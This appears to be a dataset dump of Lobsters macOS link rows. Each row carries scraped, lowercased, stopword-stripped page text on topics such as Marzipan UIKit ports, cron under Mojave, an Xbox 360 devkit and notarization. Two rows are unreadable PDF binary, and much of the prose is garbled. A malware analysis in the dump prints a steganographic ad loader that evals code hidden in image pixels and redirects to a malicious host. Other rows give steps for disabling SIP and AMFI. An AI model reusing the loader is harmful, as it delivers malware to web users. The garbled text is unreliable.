initwithidentifier comtestsegmentedcontrol itemtarget self itemaction selector setselectedindex itemsegmenttitles tab one tab two use image itemsegmentimagenames taboneicon tabtwoicon selfwindow windowtoolbarcontroller templateitems nsset setwithobject item selfwindow windowtoolbarcontroller itemidentifiers comtestsegmentedcontrol selfwindow windowtoolbarcontroller centereditemidentifier comtestsegmentedcontrol selfwindow windowtoolbarcontroller autohidestoolbarinfullscreen yes menu uikit constant standard system menu need weak link way class wl u uimenubarstandardmenuidentifierapplication wl u uimenubarstandardmenuidentifierfile wl u uimenubarstandardmenuidentifieredit wl u uimenubarstandardmenuidentifierview wl u uimenubarstandardmenuidentifierwindow wl u uimenubarstandardmenuidentifierhelp core symbol linked start build modify menu add item item eg file menu uimenubaritem myfileitem uimenubaritem alloc initwithtitle file item action selector performfileitem keyequivalent myfileitemtarget self uimenubarmenu mainmenu insertitems myfileitem atbeginningofmenu uimenubarstandardmenuidentifierfile add new menu couple item separator uimenubaritem myitemone uimenubaritem alloc initwithtitle item one action selector performitemone keyequivalent myitemonetarget self uimenubaritem myitemtwo uimenubaritem alloc initwithtitle item two action selector performitemtwo keyequivalent myitemtwotarget self uimenubarmenu mycustommenu uimenubarmenu alloc initwithtitle menu mycustommenuitems myitemone uimenubaritem separatoritem myitemtwo uimenubarmenu mainmenu insertmenu mycustommenu afterstandardmenu uimenubarstandardmenuidentifierfile menu nested traditional multilevel mac menu key equivalent given keyboard shortcut eg case contextual menu use new uicontextualmenugesturerecognizer rightclick handler display contextual menu uimenucontroller within view view controller become first responder work like gesture recognizer uimenucontroller public class may familiar show editing popup copy etc io void viewdidload super viewdidload uicontextualmenugesturerecognizer r uicontextualmenugesturerecognizer alloc initwithtarget self action selector contextualgesture selfview addgesturerecognizer r void performcontextaction id sender code go void contextualgesture uicontextualmenugesturerecognizer recognizer recognizerstate uigesturerecognizerstateended cgrect r cgrectmake recognizer locationinview nil x recognizer locationinview nil uimenuitem menuitem uimenuitem alloc initwithtitle custom action one action selector performcontextaction uimenuitem menuitemtwo uimenuitem alloc initwithtitle custom action two action selector performcontextaction uimenucontroller sharedmenucontroller setmenuitems menuitem menuitemtwo uimenucontroller sharedmenucontroller settargetrect r inview selfview uimenucontroller sharedmenucontroller setmenuvisible yes animated yes bool canbecomefirstresponder return yes sidebar uikit macos new uitableviewstylesidebar constant us simulate macstyle sidebar passthrough blurvibrancy effect use table view style app want use sidebar primary navigation structure mouse marzipan brings mouseover support uikit via new uihovergesturerecognizer stock app mojave us provide mouseover feedback graph straightforward implement like gesture recognizers uihovergesturerecognizer hover uihovergesturerecognizer alloc initwithtarget self action selector hover selfview addgesturerecognizer hover void hover uihovergesturerecognizer gesturerecognizer cgpoint p gesturerecognizer locationinview selfview gesturerecognizerstate uigesturerecognizerstatechanged code touch bar touch bar work little bit like uikeycommand io apps register touch bar responder responder get focus touchbar selector called wherein build touch bar hierarchy return touch bar much like window toolbar support handful standard macos item identifier like nstouchbaritemidentifierflexiblespace refer macos documentation touch bar support full list uitouchbar touchbar touch bar built call registerresponder uiapplication sharedapplication touchbarcontroller uibuttontouchbaritem touchbaritemone uibuttontouchbaritem alloc initwithidentifier comtesttouchbarbuttonone touchbaritemonetitle button one touchbaritemoneaction selector performtouchbaraction touchbaritemonetarget self uibuttontouchbaritem touchbaritemtwo uibuttontouchbaritem alloc initwithidentifier comtesttouchbarbuttontwo touchbaritemtwotitle button two touchbaritemtwoaction selector performtouchbaractiontwo touchbaritemtwotarget self uitouchbar touchbar uitouchbar alloc initwithidentifier comtesttouchbar touchbarallowscustomization yes touchbartemplateitems nsset setwithobjects touchbaritemone touchbaritemtwo nil touchbaritemidentifiers nstouchbaritemidentifierflexiblespace comtesttouchbarbuttonone comtesttouchbarbuttontwo nstouchbaritemidentifierflexiblespace return touchbar register responder uiapplication touchbarcontroller defined category uiapplication pretty easily interface uiapplication touchbar id touchbarcontroller end register touch bar responder ie class implement touchbar wherever suit uiapplication sharedapplication touchbarcontroller registerresponder self dark mode uikit apps macos support dark mode much way tvos respond dark mode change public api pretty simple void traitcollectiondidchange uitraitcollection previoustraitcollection selftraitcollectionuserinterfacestyle uiuserinterfacestyledark selfnavigationcontrollernavigationbarbarstyle uibarstyleblack selfviewbackgroundcolor uicolor else selfnavigationcontrollernavigationbarbarstyle uibarstyledefault selfviewbackgroundcolor uicolor whitecolor using macspecific sidebar tableview style update vibrant dark appearance one might expect conclusion little elbowgrease respect macos user work start make uikitbased app feel way natural o hope made easier example one apps tweaking use new apis afterwards go beyond nt need stop basic could start redesign table view cell spacing icon adhere closely mac hig may find middleground mac io element actually work look good desktop hybrid design integrates best io best macos think going future mac apps p one thing key remember marzipan scale everything window better suit desktop mostly transparent developer unless course trying closely match metric used appkit apps eg sidebar row height suddenly realize everything smaller case remember need scale metric use accurately display expected pps may find centered text longer centered run mac apple us different integer value nstextalignment enum nstextalignmentcentered interpreted nstextalignmentright one probably hundred tiny divergence point io macos apple doubt spent year trying fix final public marzipan sdk released decide best handle fixing particular bug project value nstextalignment typedef nsenum nsinteger nstextalignment nstextalignmentleft visually left aligned targetosiphone nstextalignmentcenter visually centered nstextalignmentright visually right aligned else targetosiphone nstextalignmentright visually right aligned nstextalignmentcenter visually centered endif nstextalignmentjustified fullyjustified last line paragraph naturalaligned nstextalignmentnatural indicates default alignment script nsenumavailableios
218,Lobsters,mac,Apple macOS,Bringing iOS Apps to macOS Using Marzipanify,https://www.highcaffeinecontent.com/blog/20190301-Bringing-iOS-Apps-to-macOS-Using-Marzipanify,bringing io apps macos using marzipanify,overview december work chameleon security preparation getting running marzipanify marzipanify marzipanify marzipanify work using marzipanify tuneup one success also able port pspdfkit viewer app advanced functionality make sing future post conclusion stroughtonsmith,wwdc apple gave u perhaps one impactful development macos since transition mac o x uikit apps running desktop today going detail special tool built called marzipanify get started uikit mac early start initial bringup io app macos nt miss post series overview uikit desktop like traditional macos framework systemiossupport directory house web dependency taken io simulator io variant webkit mapkit compiled whole platform macos called iosmac know iosmac another name rumored since december marzipan work another reason iosmac distinction many framework underneath io simulator clash horrendously builtin macos framework thanks decade divergence o x io macos today share uifoundation framework help support uikit appkit provide common code uifoundation make decision runtime based platform running affect everything interface builder text rendering simplest level mean link appkit iosmac app manner thing explode app iosmac linker variant iosmac binary explicitly prevents loading noniosmac binary library code unless whitelisted macos several new component support uikit apps top level uikit app except nt run directly layer hosted another process uikithostappxpc provides appkitbased window chrome bridge mac feature like menu bar toolbar uikithostapp managed singular uikitsystem app act windowprocessevent manager uikitsystem take place springboard traditionally sits io acting shell ui iosmac apps bridging management macos windowserver instead providing homescreen altogether appears running modern uikit macos much complex moreobvious tack chameleon took rewrote uikit mac year ago virtual machine stretch despite evolving io simulator certainly go great length distance mac apps traditionally work perhaps function incomplete state perhaps hint vision new baseline mac apps enough preamble build uikit apps macos security preparation iosmac apps follow modern pattern apple technology entitlementgated mean unless app signed private entitlement apple system refuse launch even developer hoping experiment building iosmac apps early get headstart macos public api unable build run code default macos fortunately macos unlike io system allows completely disable security bypass everything sound terrifying nt forget macos worked default o release ago recent year everything locked tightly disable security first need disable system integrity protection recovery mode add boot argument bypass apple mobile file integrity disabled mac run default wish reenable way recovery mode use terminal csrutil disable nvram bootargs reboot macos proper getting running point could absolutely set build environment iosmac apps arduous complex process form need copy uikit header mac version uikit port uikit tbd linker symbol definition file mac framework set project xcode link mac version uikit systemiossupportprivateframeworksuikitcoreframework create custom linker script pass correct argument build iosmac binary instead macosx binary probably lot recommendation simple even think built much much better safer learning iosmac similarity io simulator hunch one would able make io simulator app run iosmac app studied builtin iosmac apps mojave intently knew macho binary format pretty sure could perform requisite change statically existing binary enter marzipanify marzipanify marzipanify tool created statically convert io app built io simulator macos mean continue working building existing io app existing project using existing io sdk run tool simulator build create functioning mac app bonus marzipanify yell linking framework library nt currently exist iosmac runtime trivializes process focus adapting app rather managing build environment marzipanify work marzipanify five important thing repackages io app format macos happy redirects framework link place iosmac runtime rewrite mach header binary change flag determines whether macosx iosmac binary update infoplist appropriate key iosmac apps resigns app private entitlement iosmac apps require performs step recursively binary embedded framework everything marzipanify done hand repackaging lot moving file around creating correct folder structure redirecting library done installnametool modifying mach header done disassembler hex editor indeed process gradually figured step first place look source code much marzipanify calling commandline tool hard work using marzipanify easy way app dependency target io minimum o marzipanify myappbuiltforsimulatorapp likely way app need target older io marzipanify myappbuiltforsimulatorapp app everything need included iosmac runtime mojave app doubleclick run whoa whoa whoa back bit injectmarzipanglue explain io apple updated default output xcode linker use new load command called lcbuildversion instead traditional lcversionminiphoneos lcversionminmacosx prep environment single binary run io macos iosmac apps included mojave use method system expects iosmac apps catch apps targeting o io use load command trivial add whole new load command existing binary solve problem simplistic way marzipanify mode build library injects app conversion time library us interposing trick dyld linker thinking app running iosmac binary even still macosx binary work hack clearly dragon import foundationfoundationh import objcruntimeh import dlfcnh int dyldgetactiveplatform int mydyldgetactiveplatform return iosmac typedef struct interposes void newfunc void origfunc interposet static const interposet interposingfunctions attribute used section data interpose void mydyldgetactiveplatform void dyldgetactiveplatform tuneup depending complex app point could looking crashreporter window scratching head thing every io framework exists iosmac yet fact webkit mapkit avfoundation nt lot work first iteration iosmac even framework neccessary app might using number class omitted deprecated like uifeedbackgenerator uiwebview mfcomposeviewcontroller stage option start ifdefing portion codebase enough app nonessential feature disabled luck greeted something onscreen little cleanup may working app louis dhauwe pixure sadly longer available one success james thomson also able port io version pcalc macos marzipanify much like peter steinberger pspdfkit viewer app advanced functionality one interesting benefit injectmarzipanglue work marzipanify customize source code want inject target app useful well allows patch apps may source code fact used mechanism port apple contact app macos probably nt something need know work personally like keep separation crazy hack patch might need bringup particular app clean shipping io project make sing apple announced uikit mac mentioned list feature make uikit app feel home desktop menu toolbars mouse event however may realized class included io sdk thus ca nt used io simulator build detail use new macspecific class make app look much like mac app future post conclusion hope given superficial overview marzipanify simple tool kickstart uikit app bringup macos month sdk becomes public certainly need make great uikit mac app enough get started thinking change redesigns might need make app layout prepare future mac bright future uikit mac genuinely believe quick dirty port seen far even apple scratching surface possible developer got ta develop onwards quick dirty port start experimenting always find stroughtonsmith
219,Lobsters,mac,Apple macOS,HyperCard User's Guide (1987),https://vintageapple.org/macprogramming/pdf/HyperCard_Users_Guide_1987.pdf,hypercard user guide,,obj stream k ϋ n c ȑ u w si w qt u ӫk oӝ e h w jh qc r ok p r e j 迏yr endstream endobj obj stream e ꡉz endstream endobj obj stream zi iq wx n yl l endstream endobj obj stream k c zf
220,Lobsters,mac,Apple macOS,Fixing cron jobs in Mojave,https://blog.bejarano.io/fixing-cron-jobs-in-mojave.html,fixing cron job mojave,fixing cron job mojave great problem introduction mojave access control mechanism cron job longer access certain directory hold sensitive data happens cron job work data backupsh script fix granting full disk access cron system preference security privacy privacy full disk access icon select file click warning knockknock,fixing cron job mojave mon oct macos mojave introduces new access control mechanism let decide apps access calendar database user contact camera microphone even access whole drive great except break thing problem familiar unixlike system may know cron tiny welldesigned job scheduler installed macos system linux distribution cron let set timebased rule job execution automate thing like backup health check setting safe file permission etc introduction mojave access control mechanism cron job longer access certain directory hold sensitive data happens cron job work data backupsh script script called backupsh grab file dotfiles calendar database thingsapp database tar together encrypts tarball push backup na home schedule run hourly get home push day backup na great backupsh need access certain subdirectory homelibrary order grab calendar thing database mojave let anymore fix mojave let add apps binary full disk access whitelist let see binary run cron job see binary run system cron job usrsbincron granting full disk access cron go system preference security privacy privacy full disk access click icon add item list press commandshiftg open go dialog type usrsbincron press enter select cron file click open script access user homelibrary folder content warning great idea securitywise malicious actor create cron job edit script ran cron job would full disk access monitor system installed cron job manually tool knockknock proceed caution
221,Lobsters,mac,Apple macOS,xclip-for-mac: an executable with a xclip-compatible for shell script compatibility,https://github.com/siers/xclip-for-mac,xclipformac executable xclipcompatible shell script compatibility,xclip mac nix,xclip mac project provides executable xclipcompatible interface useful lazy refactor linux dev shell utility pipe write something pas argument position act pbcopy write nothing become pbpaste nix import nixpkgs haskellpackagescallpackage mkderivation base bytestring process stdenv fetchgit mkderivation pname xclip version src fetchgit rev url http githubcomsiersxclipformac islibrary false isexecutable true executablehaskelldepends base bytestring process description xclip mac license unlicense platform stdenvlibplatformsdarwin
222,Lobsters,mac,Apple macOS,The SDK “Power Mac G5” for the Xbox 360,https://www.journaldulapin.com/2019/01/21/power-mac-g5-sdk/,sdk power mac xbox,mac material part address install o net frankenxenon case graphic card post old example site o download file first boot xenon launcher xbox emulator explained history rom qwix page video image conclusion partager linformation avec vos amis,many year ago told xbox development kit based power mac finally managed make work let summarize story microsoft plan release xbox console based new powerpc processor xenon derived cell another story amd graphic card initially provide test machine developer microsoft issue processor exist yet solution quite pragmatic solve problem waiting first prototype console consists using common mainstream powerpc platform macintosh kit kit microsoft buy many power mac installs dedicated operating system devs arrival real console brand provides two variant developer alpha alpha kit see differ essentially graphic card used development kit used year least demonstration xbox time mac microsoft downgraded machine eventually sold employee obviously completely erased hard drive time time machine reappear ebay private home one obviously without microsoft o mac o x material part microsoft used two version power mac original one dual ghz version june variant still two ghz version nm variant work microsoft o kit ram hard drive seagate ati graphic card first kit alpha ati radeon pro mb second radeon xt mb gpus work kit came radeon pro therefore modified finally kit include intel network card pci microsoft o support internal card power mac alpha kit disappear quite quickly turning obsolete february o support gpu anymore may find information alpha kit address network card used drm long time available information indicated microsoft o checking mac serial number network card used pseudodrm nope right o right component possible install operating system standard power mac install o interesting part late group broadcasted net copy disk image xenon system name o version support radeon xt right equipment becomes possible launch o development kit time like mine also called frankenxenon really difference two apart property microsoft sticker even though obviously classier thank alphadisruptorn demonn borman yubi codeasm yasen work necessary equipment quite accurate power mac two ghz cpu frequency need version model pciexpress model dual core processor mac four slot ram eight good least mb ram normally problem hard disk gb priori necessarily seagate original model tried ssd without success mac longer original hard drive easily found ebay euro right reference may work others succeed ide optical drive mandatory problem power mac one intel network card want connect machine requires intel pci reference one provided microsoft easy find ebay xbox controller original usb adapter wired xbox controller careful play charge version ati radeon xt mb two dvi output important mac bios complicated part let detail right hard drive compatible graphic card also need time screen dvi sata usb adapter machine connect hard drive internally case graphic card really bothering part ideal solution radeon xt mac dvi output adc output powered agp port apple non standard connector problem overpriced least otherwise flash pc card explained method post french work perfectly careful use card old example card must two dvi output dvi output plus vga output course need agp version pciexpress alternative solution need ati firegl professional version card possible flash radeon xt bios mac bios found site card fair price ebay well le default memory card samsung memory others infineon memory infineon seem work standard frequency bug mac bios card infineon memory artifact appear startup case also flash frequency detail unless someone really want try method go software one used flash bios basically get frequency lower get clean image find card samsung memory molex plug integration power supply nasty memory infineon memory slowed integration pc card firegl requires recover power card mac powered connector originally intended adc pc card go molex plug requires double molex socket allow recover power optical drive normally cable long enough put adapter back optical drive careful optical drive still need power make microsoft o work last step installation need dvi screen case kit start properly vga screen even dvi vga adapter o download file quite compact le mb contains compressed disk image beware requires gb disk space decompression take time theory restored hard drive gb practice managed run seagate apple may work version come apple test hand two different ssds hard disk restore go dd command macos equivalent linux window necessary determine logical name disk command diskutil list example unmount potential partition disk sudo diskutil unmount restore image beware command erase disk pick right disk erase data careful value path disk image drag file terminal value disk name indicates size block problem fixing b mb know normal ran last test without indicating extremely slow far hour may work value try ssd specify higher value speed transfer sudo dd ifusersyoudownloadsimagedisqueimg image restored macos display xeboot partition mb apple o support xbox fatx file system spot first boot let test right component work hard drive must plugged sata slot top one advise perform complete reset mac either classic command command option p r startup entering open firmware command option f startup following command resetnvram resetall setdefaults start xenon o work forum topic help machine crash lot noise may put back transparent cover correctly grey image nothing try changing screen plug also check controller reacts xbox model central led activated passing player top left come ask o xenon launcher basic interface show installed executables option controlled controller either xbox controller original xbox controller usb adapter setting reduced minimum definition output type network setting etc disk image contains program like dolphin demo exists xbox exe xbox emulation xeb also demo option option dolphin demo xbox exe dolphin test scene xbox dashboard dashboard dashboard quit return launcher addition xbox dashboard quite old option mostly lot unusable function theory also possible use beta version xbox game title found work let say beta title developed time alpha kit pas end post video showing screenshots interface xbox emulator sdk includes xbox emulator first one theory allows launch image xbox game famous xbe practice extremely random emulation first xbox always quite problematic even though many thought would emulated easily family air pc practice explained complicated complicated two emulator work pretty well microsoft fusion xbox fission xbox one actually used backward compatibility console case require downloading data quite logically xbox development kit contains preliminary partially functional version emulator would used backward compatibility history rom talking emulation especially game always little complicated could find making disk image xbox game something complicated requires precise optical drive modified firmware model exist basically bought original game fair price try without necessary equipment useless practice therefore necessary download iso folder containing xbe file executables console inevitably illegal reason get iso file qwix program extract necessary file also possible extract game modified xbox lazy use debug version work launcher part quickly annoying world rom xbox little complicated first several version game name halo came across four different version including demo beta lot downloadable game patched work modified xbox console break compatibility development kit therefore hoped iso patched person made change thought leaving original executable obviously often case finally game must work perhaps complicated thing tested original unpatched file present must renamed correctly priori named defaultxbeorig rename defaultxbe work space harrier dead alive implementation first requires intel network card little time fact intel card mb model data go development kit maximum mb find xbox sdk software let look install window machine running network development kit launch xbox neighborhood add kit using ip address shown home screen simply copy data game development volume folder devkit halo halo halo simpson test help page found software work go halo first halo simpson game made short video example screenshot bit capricious sound recorded analog audio output power mac average quality sound played digital acquisition card video show halo game simpson xbox arcade game tested iso thirty title halo one particularly fluid bit arduous played without sound mostly never played halo life video image tried capture picture easy kit start connected acquisition card solution start screen change plug addition change definition interface game issue little work xbox application apparently allow come back interface restart periodically finally see artifact one scene obviously put bit high frequency gpu sound video card manage digital sound dvi captured analog line output mac video video conclusion let clear obviously useless advanced development kit solution obsolete historical point view rather interesting see choice microsoft quite pragmatic developing console frankly mac property microsoft collection still pretty fun partager linformation avec vos amis related
223,Lobsters,mac,Apple macOS,How to gain root with CVE-2018-4193 in < 10s,https://www.synacktiv.com/ressources/OffensiveCon_2019_macOS_how_to_gain_root_with_CVE-2018-4193_in_10s.pdf,gain root,,äüöß obj stream k x b j b endstream endobj obj endobj obj stream z ol g xѡ ӣt eլ jߡ v e v n xdi l 呐ҹ jzh oa
224,Lobsters,mac,Apple macOS,Mili – an open-source tool for auto-login hotspot pages,https://github.com/SadeghHayeri/Mili,mili opensource tool autologin hotspot page,mili hotspot auto login script never see login page share percentage installation usage,mili hotspot auto login script never see login page mili open source tool auto login hotspot page tired inserting username password internet access mili friend every time connect new wifi mili check mikrotik service try login addition set one login info example close friend password mili every time mili try use random user yes set share percentage example logininformation username user password pas share username user password pas share installation git clone http githubcomsadeghhayerimiligit cd miliscripts installsh mili config maconly disable captive popup page optional note disabling sip unsafe enable immediately rename captive network restart mac o x start hold commandr keep held see apple icon progress bar release boot recovery utility menu select terminal prompt type exactly following press return csrutil disable terminal display message sip disabled finder select go go folder enter systemlibrarycoreservices hit return find captive network assistant click rename extra word like captive network assistant launch press return enter password prompted make change menu select restart usage initchange configs mili config check login mili force login mili login login specific user password must saved beforehand mili login username status mili status logout mili logout
225,Lobsters,mac,Apple macOS,25 Years Ago: RAM Doubler,https://daringfireball.net/2019/01/ram_double_engst,year ago ram doubler,year ago ram doubler writing tidbit macworld expo year ago start series fun,year ago ram doubler monday january adam engst writing tidbit macworld expo year ago ram doubler single small extension literally double ram guessing compression ratio like salient autodoubler diskdoubler owned symantec actually see total memory twice builtin memory since ram doubler extension control configuration install double amount application ram available number people expressed disbelief feat possible saying avoid anything like ram doubler obviously strange thing memory safe needle say since ram doubler day testing long honestly say neither u noticed anything ordinary time start series tidbit running looking back old article archive use ram doubler mac lc required processor lc used mac really work advertised doubled ram exchange negligible cost performance amazing thing hindsight compression clever virtual memory technique could double memory mac o open something lowlevel ram doubler even possible effectively mac running ram doubler running fork o subtle fork fork entire memory manager written third party hindsight lack protected memory disk permission classic mac o generally looked back upon severe deficiency certainly deep problem architecture one app extension crashing often resulted entire machine going anything go openness also resulted tremendous opportunity thirdparty software lowlevel computer science operating system perspective classic mac o dangerously primitive highlevel user interface perspective remains amazing install ram doubler software radically changed way o worked copy one file extension folder system folder uninstall moved folder one file one special folder restart machine thirdparty extension could exasperating yes could also amazing plain fun way possible today
226,Lobsters,mac,Apple macOS,How to notarize your software on macOS,https://successfulsoftware.net/2018/11/16/how-to-notarize-your-software-on-macos/,notarize software macos,say dropdmg http http http http http http lapcatsoftwarecomarticlesdebuggingmojavehtml,please note wordpress keep mangling code example changing double dash single dash tried fix changed back anyone know get around please put something comment apple want notarize software process upload software apple server scanned certified malware free probably become compulsory point even especially software apple app store apple say give user even confidence software submitting apple notarized service automatically scan developer idsigned software performs security check ready export distribution ticket attached software let gatekeeper know notarized user macos mojave first open notarized app installer package disk image see streamlined gatekeeper dialog confidence known malware note upcoming release macos gatekeeper require developer id signed software notarized apple documentation notarization bit thin ground especially want notarize software built using xcode build software using qtcreator writing experience first need ensure macos xcode installed command line tool need current apple developer account codesign app hardened runtime using runtime codesign developer id application developer id runtime app file eg codesign developer id application acme ltd runtime myappapp hardened runtime limit data resourced application access sure exact ramification seem restrict software anything could previously check signing codesign app file eg codesign myappapp package app dmg eg using dropdmg upload dmg apple server xcrun altool osx f dmg file bundle id username eg xcrun altool osx f myappdmg comacmemyapp acmecom prompted apple developer password include command line wait minute upload successful error uploading shown unique id returned use request upload scanned xcrun altool notarize id u username eg xcrun altool xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx u acmecom prompted apple developer password include command line hopefully see status message package approved notarization fails sent link online log file describing issue notarization completes successfully need staple result dmg xcrun stapler staple v dmg file eg xcrun stapler staple v myappdmg stapler output log including odd phrase mine included humanity must endure let see work adding blob superblob blob enjoy weird hopefully end staple validate action worked finally unpack dmg app verify spctl v app file eg spctl v applicationsmyappapp macos earlier os say sourcenotarized developer id software run without warning dialog congratulation seems rather clumsy wait asynchronously unique id returned step complete step easy fully automate script major pain arse anyone work way automate whole process please let know link various post gleaned information http http http http http http lapcatsoftwarecomarticlesdebuggingmojavehtml
227,Lobsters,mac,Apple macOS,Confiant & Malwarebytes Uncover Steganography Based Ad Payload That Drops Shlayer Trojan On Mac,https://blog.confiant.com/confiant-malwarebytes-uncover-steganography-based-ad-payload-that-drops-shlayer-trojan-on-mac-cd31e885c202,confiant malwarebytes uncover steganography based ad payload drop shlayer trojan mac,http sadpixelcomssccjpg,much buzz around type attack believe image file alone threat fear image browser load day day web surfing departure truth validating integrity individual image file served ad make little sense within broader context execution payloadsin fact steganography come play order deliver part payload image need processed order piece extracted utilized image alone harm computer redirect browserlet look code canvas idiak canvas script var wsw var volton var canvas document getelementbyid iak var ctx canvas getcontext var image new image image crossorigin image src http sadpixelcomssccjpg var r var issupportfontfamily function c typeof c string return var arial c tolowercase tolowercase return var e var f var g h var document createelement canvas var j getcontext width g height h j textalign center j fillstyle black j textbaseline middle var k function l j clearrect g h j font f l j filltext e g h var j getimagedata g h data return slice call filter function n return n return k join k c join var rixs document getelementsbytagname body var rrxt rixs style csstext issupportfontfamily applesystem rrxt margin image onload function ctx drawimage image var ctx getimagedata image width image height var p q q p p q r string fromcharcode data p eval r script translated plain english code would look something like create canvas object enables use canvas api order interact image underlying data grab image located hxxp sadpixelcomssccjpgdefine function check specific font family supported browsercheck apple font supported nothingif loop underlying data image file loop read pixel value translates alphanumeric characteradd newly extracted character stringexecute code stringimages loosely speaking utilize nonexecutable file format storing compressed data browser image viewer choice load image file basically uncompresses file us data paint image one pixel time malicious image look like hex editor much way image viewer need uncompress data order render final result web developer able lowlevel manipulation image data using javascript canvas apithe data manipulation happens handful line code image small white bar hidden code extracted image look like toplocationhref hxxp veryieldmalystcom volton wsw parameter populated hxxp
228,Lobsters,mac,Apple macOS,Advanced Mac Substitute,https://www.v68k.org/advanced-mac-substitute/,advanced mac substitute,advanced mac substitute advanced mac substitute system twilight advanced mac substitute lode runner advanced mac substitute prologue fool errand advanced mac substitute amazing advanced mac substitute welcome advanced mac substitute factored application backend frontend solitaire advanced mac substitute amazing solitaire missile iago missile advanced mac substitute iago advanced mac substitute support source source code try advanced mac substitute nyanochrome cat advanced mac substitute older documentation,advanced mac substitute advanced mac substitute advanced mac substitute apilevel reimplementation classic mac o run mac application emulator without apple rom system software system twilight running advanced mac substitute lode runner running advanced mac substitute opening prologue cinematic fool errand running advanced mac substitute amazing running advanced mac substitute point see solved maze unlike traditional emulator advanced mac substitute emulate hardware operating system run except processor actually replaces o launch directly application without startup phase welcome advanced mac substitute application real loading screen advanced mac substitute factored application backend includes emulator build run posixlike system frontend generic bitmapped terminal abstraction ported four platform far classic mac o mac o x linux framebuffer android solitaire running advanced mac substitute android phone advanced mac substitute capable running several application written original macintosh computer example include four game amazing solitaire missile iago missile running advanced mac substitute point see next frame iago running advanced mac substitute point see current support includes graphic region circle roundrects line cursor grafports text window control menu dialog source source code advanced mac substitute github feeling adventurous try advanced mac substitute x window system linux framebuffer console mac o x version homebrew nyanochrome cat running advanced mac substitute point animate older documentation moved revision way
229,Lobsters,mac,Apple macOS,Portable Node.js guide,https://github.com/ehmicky/portable-node-guide,portable nodejs guide,care nodejs user survey table content summary see also support submit issue github chat u gitter code conduct contributing guideline,write crossplatform nodejs code care according nodejs user survey nodejs developer use window locally use mac production use linux use bsd table content summary see also support found error would like add information nt hesitate submit issue github question feel free chat u gitter everyone welcome regardless personal background enforce code conduct order promote positive inclusive environment contributing project made simplest way give back starring sharing online documentation unclear typo please click page edit button pencil icon suggest correction would like help u fix error add information please check guideline pull request welcome thanks go wonderful people
230,Lobsters,mac,Apple macOS,The Most Powerful Mac is 6yrs Old and Not Sold by Apple,https://motherboard.vice.com/en_us/article/8xkq8k/mac-pro-upgrade-community,powerful mac old sold apple,imac pro facebook group mac pro upgrade big little frank delidding went press tour let pro community know mac pro dead,many pro application powerful mac computer buy today imac pro best mac buy today new even sold six year old sold thirdparty company denmark small growing community creative editor audio engineer software developer modeler graphic modifying circa mac pro even powerful one apple sell today computer use topoftheline graphic card nt compatible imac pro mac pro modded computer crushing benchmark even brand new new computer mac pro known community cheese grater mac pro tower last highly upgradeable modifiable desktop computer apple sold moving muchmaligned black trash design sold today changed significantly since upgraded version many case fastest apple computer buy today people putting new cpu ram ssds modern graphic card cheese grater mac many case superior buy apple today facebook group mac pro upgrade filled people scooping old mac pro ebay craigslist modifying hell using skeleton machine gianluca mazzarolo owner denmarkbased big little frank make custom mac pro creative professional told phone cpu nothing drastic happened last year lot pro want need good gpu found way put two good one old mac thing better mac offered moment helping company close huge stopgap whenever introduce new mac pro pitfall installing new cpu sometimes involves delidding processor mean removing shield make compatible certain newer component compatible driver exist lack thunderbolt port make nonstarter certain people mazzarolo also find way reroute mac pro power supply directly power electricityintensive modern gpus designed power computer motherboard many potential problem completely solved community like hackintosh community facebook group running list compatible incompatible part share written video tutorial upgrading computer even found way upgrade mac pro mac pro firmware update endaround lack thunderbolt port people using gb ethernet connection directly connect computer massive hard drive store medium big little frank business aimed pro community feel like apple let killing upgradeability macbook pro mac pro feel completely ridiculous go applecom find computer better mazzarolo said think lot people group see upgrading mac pro cheaper way get functional mac think point really essence essence people wanted powerful mac apple give various people experimenting diy mac pro upgrade lot youtubers sharing method upgrading computer mazzarolo right wide sect apple customer base upset fact updated mac pro since new macbook pro unupgradeable usbc port expand last year apple went press tour let pro community know mac pro new model yet announced response gap market hackintosh community thrived mac pro upgrade community risen reason older mac pro become powerful even though cuttingedge cpu work driver often exist case sixyearold motherboard handle mac pro designed accommodate core even though single core fast imagine video editing core together faster brandnew macbook mazzarolo said new imac pro core new macbook pro max four core take whopping gb ram equal fully upgraded imac pro take double apple say trash mac pro max worth noting ram used newer mac computer usually faster modified use modern ssds mazzarolo said case faster one used new imac pro use almost brandnew graphic card manufacturer main reason fully soupedup old mac pro outperform new computer rendering engine amd card apple us new mac pro even work said general even midlevel graphic card put fast imac pro put better card put two facebook group mazzarolo posted benchmark one custombuilt rig playing red raw video clip currentmodel apple computer new macbook pro recent trash mac pro capable playing video framespersecond custombuilt model able get fps case clear even highly modified mac pro able outperform newer computer many daytoday task modified computer specifically made video editing graphic design audio recording editing many mazzarolo client work industry seen people trying play brand new video game older machine instance wildly unpredictable result mazzarolo also know line work exist forever machine vary price includes separate external hardware specific client tell client computer likely competitive another couple year longer make sense modify computer year half cpu ram technology stock computer improves point component still compatible old mac pro longer compete like everyone else pro world anxiously waiting apple announce new mac pro come say apple favor keeping people switching pc meantime helping company close huge stopgap whenever introduce new mac pro said gap piss lot people
231,Lobsters,mac,Apple macOS,4 Things I Miss About Mac,https://daverupert.com/2019/01/things-i-miss-about-mac/,thing miss mac,pitched davegoeswindows shop talk plateau productivity wake sleep linuxstyle disk writes longstanding year old issue general performance wsl rich turner replied twitter quality thirdparty apps tower smart quote alt code aaron gustafson autohotkey config window insider new emojikaomojisymbol picker list may different,almost year since pitched davegoeswindows shop talk happy window user account really see switching back time soon thing mac miss feel finally reached plateau productivity clear head look back handful mac platform feature wish window wake sleep one incredible feature mac experience pull laptop bag open lid mac laptop instantly wake resume previous session even month stored away drawer macbooks hold charge light like using minute ago struggled replicate window device sure even possible window supposed new instant feature work well closing lid minute still work quite like mac multiple day even new surface laptop open morning greeted dead screen hit power button see bios logo waking computer hibernation get login screen window hello time pick log long definitely palpable feel instant advertised lot time however computer never wake get low battery warning instead frequently encounter problem want hop quick task forced wander house looking power adapter possible open mac get dead battery warning seems like rarely happens even week unplugged power management hard apple seems figured linuxstyle disk writes see really unsee apologize longstanding year old issue general performance wsl infamous issue situation understand due nature window extensible file system add filter like antivirus etc window file operation expensive read somewhere save file window rename create tmp backup file window attempt write file successful delete backup file even deleting file window open read metadata close deleting window defender also mixed performs quick virus scan recently rewritten file back day slow computer mechanical hard disk error prone operating system probably great choice want end losing paper like ellen usually interrupt workflow bad news lot modern web development dependent large multifile rewrite operation querying file metadata staticsite generation automatic image optimization packing bundle save et cetera get bogged window known issue wsl team say working detail far guess would require new filesystem least filter optout mechanism update rich turner replied twitter said stat syscalls particular really expensive call happens often smart people working 